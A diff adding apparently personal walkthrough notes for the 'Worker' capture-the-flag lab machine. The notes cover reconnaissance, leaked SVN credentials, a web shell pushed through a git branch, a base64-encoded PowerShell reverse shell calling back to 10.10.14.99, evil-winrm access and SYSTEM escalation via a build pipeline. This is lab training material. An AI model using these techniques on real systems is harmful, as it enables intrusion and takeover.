@@ -1,0 +1,232 @@
+Machine-Name : Worker
+IP-Address   : 10.129.2.29
+
+Command-Line: sudo nmap 10.129.2.29 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line: sudo nmap 10.129.2.29 -p- -A -T4 -o nmap/vuln.txt --script vuln
+Result:
+    ./nmap/vuln.txt
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://10.129.2.29
+Result:
+    ./recon/recon-1.txt
+
+Command-Line: mkdir svn; cd svn;
+Command-Line(./svn): svn ls svn://10.129.2.29
+Result:
+    dimension.worker.htb/
+    moved.txt
+
+Command-Line: svn log svn://10.129.2.29
+Result:
+    ------------------------------------------------------------------------
+    r5 | nathen | 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line
+
+    Added note that repo has been migrated
+    ------------------------------------------------------------------------
+    r4 | nathen | 2020-06-20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line
+
+    Moving this repo to our new devops server which will handle the deployment for us
+    ------------------------------------------------------------------------
+    r3 | nathen | 2020-06-20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line
+
+    -
+    ------------------------------------------------------------------------
+    r2 | nathen | 2020-06-20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line
+
+    Added deployment script
+    ------------------------------------------------------------------------
+    r1 | nathen | 2020-06-20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line
+
+    First version
+    ------------------------------------------------------------------------
+
+Command-Line(./svn): svn checkout svn://10.129.2.29
+Result:
+    total 20
+    drwxr-xr-x 4 kali kali 4096 Sep  7 19:56 .
+    drwxr-xr-x 5 kali kali 4096 Sep  7 19:52 ..
+    drwxr-xr-x 4 kali kali 4096 Sep  7 19:56 dimension.worker.htb
+    -rw-r--r-- 1 kali kali  162 Sep  7 19:56 moved.txt
+    drwxr-xr-x 4 kali kali 4096 Sep  7 19:56 .svn
+
+Command-Line(./svn): cat moved.txt
+Result:
+    This repository has been migrated and will no longer be maintaned here.
+    You can find the latest version at: http://devops.worker.htb
+
+    // The Worker team :)
+
+Notes: Added "devops.worker.htb" and "dimension.worker.htb" to "/etc/hosts" on local kali.
+
+Command-Line(./svn/dimension.worker.htb): grep http: -r * | grep -o .*.worker.htb | sed 's/<a href="http:\/\///g'
+Result:
+    alpha.worker.htb
+    cartoon.worker.htb
+    lens.worker.htb
+    solid-state.worker.htb
+    spectral.worker.htb
+    story.worker.htb
+Notes: Copying results into "/etc/hosts" and checking each subdomain address.
+
+Command-Line: svn help up
+Notes: Updates to the latest version. "-r rev" can be used to specify the revision. There seems to be 5 revisions.
+
+Command-Line: svn up -r 1
+Result:
+    Updating '.':
+    D    moved.txt
+    Updated to revision 1.
+
+Command-Line: ls
+Result:
+    dimension.worker.htb
+Notes: Removed "moved.txt".
+
+Command-Line: svn up -r 2
+Result:
+    Updating '.':
+    A    deploy.ps1
+    Updated to revision 2.
+Notes: Added deploy.ps1
+Command-Line: ls
+Result:
+    deploy.ps1  dimension.worker.htb
+Command-Line: cat deploy.ps1
+Result:
+    $user = "nathen"
+    $plain = "wendel98"
+    $pwd = ($plain | ConvertTo-SecureString)
+    $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+    $args = "Copy-Site.ps1"
+    Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+Notes: Credentials found. User "nathen" : Password "wendel98".
+
+Command-Line: svn up -r 3
+Result:
+    Updating '.':
+    U    deploy.ps1
+    Updated to revision 3.
+
+Command-Line: ls
+Result:
+    deploy.ps1  dimension.worker.htb
+Command-Line: $user = "nathen"
+Result:
+    # note: We cant have my password here!!!
+    $plain = ""
+    $pwd = ($plain | ConvertTo-SecureString)
+    $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+    $args = "Copy-Site.ps1"
+    Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+Notes: Removed password.
+
+Command-Line: svn up -r 4
+Result:
+    Updating '.':
+
+    D    deploy.ps1
+    Updated to revision 4.
+Command-Line: ls
+Result:
+    dimension.worker.htb
+
+Command-Line: svn up -r 5
+    Updating '.':
+
+    A    moved.txt
+    Updated to revision 5.
+Notes: Returned to updated version. Version "5".
+
+Notes: Used the credentials of "nathen" and "wendel" to log into devops.worker.htb. From there I cloned a repo (spectral), added a malicious aspx file and was able to obtain command-injection.
+Command-Line: git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
+Result:
+    ./spectral
+Command-Line: cd spectral
+Command-Line(./spectral): cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx .
+Command-Line(./spectral): git branch uk47
+Command-Line(./spectral): git checkout uk47
+Result:
+    I am now on branch: uk47
+Command-Line(./spectral): git add .
+Command-Line(./spectral): git commit -m "Adding feature"
+Command-Line(./spectral): git push origin uk47
+
+Notes: In devops.worker.htb I was able to merge to make a pull request and merge the code from the "uk47" branch to the "master/main" branch.
+Browser: http://spectral.worker.htb/cmd.aspx
+Result:
+Command-Injection (text-input)
+Command-Line: mkdir www ; cd www
+Command-Line(./www): cp /home/kali/HackingTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
+Notes: Changed IP and Port.
+Command-Line(./www): cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t UTF-16LE |base64 -w0 | xclip -selection clipboard
+Result:
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOQA5ACcALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
+
+Command-Line: nc -lvnp 9001
+Notes: Inside the command-injection text-input, I entered the following code:
+CODE: powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOQA5ACcALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA
+
+Result:
+    *** REVERSE SHELL ***
+
+PS C:\> whoami
+Result:
+    iis apppool\defaultapppool
+
+PS C:\> dir c:\Users
+Result:
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    d-----       2020-03-28     14:59                .NET v4.5
+    d-----       2020-03-28     14:59                .NET v4.5 Classic
+    d-----       2020-08-18     00:33                Administrator
+    d-r---       2020-03-28     14:01                Public
+    d-----       2020-07-22     01:11                restorer
+    d-----       2020-07-08     19:22                robisl
+
+Notes: Found user "robisl". Search "w" drive.
+
+PS W:\> type svnrepos\www\conf\passwd
+Result:
+    ./www/credentials.txt
+Notes: Found password for user "robisl", password "wolves11".
+
+Command-Line: crackmapexec winrm 10.129.2.29 -u "robisl" -p "wolves11"
+Result:
+    [*] completed: 100.00% (1/1)
+    WINRM       10.129.2.29     5985   NONE             [*] None (name:10.129.2.29) (domain:None)
+    WINRM       10.129.2.29     5985   NONE             [*] http://10.129.2.29:5985/wsman
+    WINRM       10.129.2.29     5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)
+
+Command-Line(~/HackingTools/evil-winrm): ./evil-winrm.rb -i 10.129.2.29 -u "robisl" -p "wolves11"
+Result:
+    Evil-WinRM shell v3.3
+    Info: Establishing connection to remote endpoint
+    *** USER ACCESS ***
+
+*Evil-WinRM* PS C:\Users\robisl\Documents> type ../Desktop/user.txt
+Result:
+    6fe7e0b502019bfe6f1906932f4e229e
+    *** USER OWNED ***
+
+Command-Line: nc -lvnp 9002
+Command-Line(./www): cp Invoke-PowerShellTcpOneLine.ps1 Invoke-PowerShellTcpOneLine-2.ps1
+Command-Line(./www): sudo pyton3 -m http.server --bind 10.10.14.99 80
+*Evil-WinRM* PS C:\Users\robisl\Desktop> wget 10.10.14.99:80/Invoke-PowerShellTcpOneLine-2.ps1 -o shell.ps1
+
+Notes: Signed into "devops.worker.htb" as "robisl:wolves11". Build a "Pipeline". Clicked "Use the classic editor". Clicked "Azure Repos Git", then "Continue". Scrolled to bottom. Selected "Empty Pipeline", then clicked "Apply". Set "Agent-Pool" to "setup". In "Agent job 1" box, click "+" sign to add a task to agent job. Searched "Powershell", clicked "Add" from "Powershell" box. Clicked "Powershell Script". Set "Script Path" to "C:\Users\robisl\Desktop\shell.ps1". Set "ErrorActionPreference" to "Continue". Clicked on "Save and queue" 3 times. Clicked on "build" number. Waited for the process to run.
+Result:
+    whoami
+    nt authority\system
+    *** ROOT ACCESS ***
+
+PS W:\> cd C:\
+PS C:\> type C:\users\administrator\desktop\root.txt
+Result:
+    1104636439bbeca8251e5fe19b5573b9
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
